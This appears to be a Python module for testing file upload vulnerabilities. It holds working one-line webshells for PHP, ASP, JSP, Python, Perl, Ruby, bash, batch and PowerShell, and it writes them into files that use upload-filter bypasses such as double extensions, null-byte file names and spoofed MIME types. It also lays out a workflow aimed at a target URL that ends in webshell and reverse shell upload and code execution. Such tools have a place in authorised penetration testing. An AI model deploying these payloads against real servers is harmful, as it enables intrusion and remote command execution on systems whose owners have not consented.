"""
File upload testing framework for vulnerability assessment.

This module changes when file upload attack vectors or bypass techniques change.
"""

from typing import Dict, Any, List
import logging
import os
import tempfile

logger = logging.getLogger(__name__)

class FileUploadTestingFramework:
    """Specialized framework for file upload vulnerability testing"""
    
    def __init__(self):
        self.malicious_extensions = [
            "php", "php3", "php4", "php5", "phtml", "asp", "aspx", "jsp", "jspx",
            "py", "pl", "rb", "sh", "bat", "cmd", "exe", "scr", "com", "pif"
        ]
        self.bypass_techniques = [
            "double_extension", "null_byte", "case_variation", "special_chars",
            "mime_type_spoofing", "content_type_manipulation", "polyglot_files"
        ]
        self.test_payloads = {}
        self._initialize_payloads()
    
    def _initialize_payloads(self):
        """Initialize test payloads for different file types"""
        self.test_payloads = {
            "php_webshell": '<?php system($_GET["cmd"]); ?>',
            "asp_webshell": '<%eval request("cmd")%>',
            "jsp_webshell": '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
            "python_webshell": 'import os; os.system(request.args.get("cmd"))',
            "perl_webshell": 'system($ARGV[0]);',
            "ruby_webshell": 'system(ARGV[0])',
            "bash_webshell": '#!/bin/bash\n$1',
            "batch_webshell": '@echo off\n%1',
            "powershell_webshell": 'Invoke-Expression $args[0]'
        }
    
    def generate_test_files(self, target_extensions: List[str] = None) -> List[Dict[str, Any]]:
        """Generate test files for upload testing"""
        if target_extensions is None:
            target_extensions = self.malicious_extensions
        
        test_files = []
        
        for ext in target_extensions:
            base_payload = self._get_payload_for_extension(ext)
            
            for technique in self.bypass_techniques:
                test_file = self._create_test_file(ext, base_payload, technique)
                if test_file:
                    test_files.append(test_file)
        
        return test_files
    
    def _get_payload_for_extension(self, extension: str) -> str:
        """Get appropriate payload for file extension"""
        payload_mapping = {
            "php": self.test_payloads["php_webshell"],
            "php3": self.test_payloads["php_webshell"],
            "php4": self.test_payloads["php_webshell"],
            "php5": self.test_payloads["php_webshell"],
            "phtml": self.test_payloads["php_webshell"],
            "asp": self.test_payloads["asp_webshell"],
            "aspx": self.test_payloads["asp_webshell"],
            "jsp": self.test_payloads["jsp_webshell"],
            "jspx": self.test_payloads["jsp_webshell"],
            "py": self.test_payloads["python_webshell"],
            "pl": self.test_payloads["perl_webshell"],
            "rb": self.test_payloads["ruby_webshell"],
            "sh": self.test_payloads["bash_webshell"],
            "bat": self.test_payloads["batch_webshell"],
            "cmd": self.test_payloads["batch_webshell"]
        }
        
        return payload_mapping.get(extension, f"# Test payload for {extension}")
    
    def _create_test_file(self, extension: str, payload: str, technique: str) -> Dict[str, Any]:
        """Create test file with specific bypass technique"""
        try:
            temp_dir = tempfile.mkdtemp()
            
            if technique == "double_extension":
                filename = f"test.jpg.{extension}"
            elif technique == "null_byte":
                filename = f"test.{extension}%00.jpg"
            elif technique == "case_variation":
                filename = f"test.{extension.upper()}"
            elif technique == "special_chars":
                filename = f"test.{extension};"
            else:
                filename = f"test_{technique}.{extension}"
            
            filepath = os.path.join(temp_dir, filename)
            
            with open(filepath, 'w') as f:
                f.write(payload)
            
            content_type = self._get_content_type(extension, technique)
            
            return {
                "filename": filename,
                "filepath": filepath,
                "extension": extension,
                "technique": technique,
                "payload": payload,
                "content_type": content_type,
                "size": len(payload)
            }
            
        except Exception as e:
            logger.error(f"Error creating test file: {str(e)}")
            return None
    
    def _get_content_type(self, extension: str, technique: str) -> str:
        """Get content type for file, potentially spoofed"""
        normal_types = {
            "php": "application/x-php",
            "asp": "application/x-asp",
            "jsp": "application/x-jsp",
            "py": "text/x-python",
            "pl": "text/x-perl",
            "rb": "text/x-ruby",
            "sh": "application/x-sh",
            "bat": "application/x-bat",
            "exe": "application/x-executable"
        }
        
        if technique == "mime_type_spoofing":
            return "image/jpeg"
        elif technique == "content_type_manipulation":
            return "text/plain"
        else:
            return normal_types.get(extension, "application/octet-stream")
    
    def create_upload_testing_workflow(self, target_url: str, 
                                     upload_parameter: str = "file") -> Dict[str, Any]:
        """Create comprehensive file upload testing workflow"""
        workflow = {
            "target": target_url,
            "parameter": upload_parameter,
            "phases": [
                {
                    "name": "reconnaissance",
                    "description": "Analyze upload functionality and restrictions",
                    "tests": [
                        "identify_upload_endpoints",
                        "analyze_client_side_restrictions",
                        "check_file_type_validation",
                        "test_file_size_limits"
                    ],
                    "estimated_time": 300
                },
                {
                    "name": "bypass_testing",
                    "description": "Test various bypass techniques",
                    "tests": [
                        "double_extension_bypass",
                        "null_byte_injection",
                        "case_sensitivity_bypass",
                        "mime_type_spoofing",
                        "content_type_manipulation",
                        "polyglot_file_upload"
                    ],
                    "estimated_time": 600
                },
                {
                    "name": "payload_testing",
                    "description": "Upload malicious payloads",
                    "tests": [
                        "webshell_upload",
                        "reverse_shell_upload",
                        "path_traversal_upload",
                        "zip_bomb_upload",
                        "xxe_payload_upload"
                    ],
                    "estimated_time": 450
                },
                {
                    "name": "post_upload_analysis",
                    "description": "Analyze uploaded files and execution",
                    "tests": [
                        "locate_uploaded_files",
                        "test_file_execution",
                        "check_file_permissions",
                        "verify_payload_functionality"
                    ],
                    "estimated_time": 300
                }
            ],
            "total_estimated_time": 1650,
            "success_indicators": [
                "successful_webshell_upload",
                "arbitrary_file_upload",
                "path_traversal_success",
                "code_execution_achieved"
            ]
        }
        
        return workflow
